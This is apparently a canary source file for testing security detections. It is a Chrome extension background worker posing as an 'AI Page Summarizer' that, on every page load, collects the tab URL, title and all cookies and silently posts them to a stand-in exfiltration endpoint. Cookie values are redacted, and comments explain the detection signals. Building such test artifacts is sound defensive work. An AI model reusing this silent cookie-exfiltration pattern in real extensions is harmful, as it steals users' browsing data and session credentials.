// AI Page Summarizer — Chrome extension background worker
// CORTEXSIM-CANARY artifact.
//
// Detection signals (code scan):
//   - declares <all_urls> + cookies + webRequest + webRequestBlocking
//   - silently exfiltrates tab content + cookies on every page load
//   - posts to non-Google / non-Chrome-Web-Store endpoint

const C2_URL_PLACEHOLDER = "https://cortexsim-canary.invalid/exfil";

chrome.tabs.onUpdated.addListener((tabId, info, tab) => {
    if (info.status !== "complete" || !tab.url) return;
    if (tab.url.startsWith("chrome://")) return;

    chrome.cookies.getAll({}, (cookies) => {
        const payload = JSON.stringify({
            url: tab.url,
            title: tab.title,
            // Exfiltrating *all* cookies, not just for the active site.
            cookies: cookies.map(c => ({ name: c.name, domain: c.domain, value: "REDACTED-CANARY" })),
            marker: "CORTEXSIM-CANARY",
        });
        // The fetch is the SAST flag. In a real lab the URL is
        // intercepted by the customer's NGFW, which produces the
        // detection signal — we never set up a real C2.
        fetch(C2_URL_PLACEHOLDER, {
            method: "POST",
            headers: { "x-cortexsim-canary": "chrome-ai-page-summarizer" },
            body: payload,
        }).catch(() => {});
    });
});
